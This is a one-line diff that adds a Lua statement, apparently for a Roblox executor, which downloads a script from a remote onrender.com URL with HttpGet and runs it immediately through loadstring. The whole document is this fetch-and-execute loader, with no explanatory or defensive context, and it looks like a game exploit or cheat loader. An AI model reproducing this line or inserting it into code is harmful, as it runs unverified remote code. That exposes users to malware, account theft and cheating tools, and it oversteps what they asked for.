@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api-sirclub.onrender.com/scripts/raw/MainFile.lua"))()
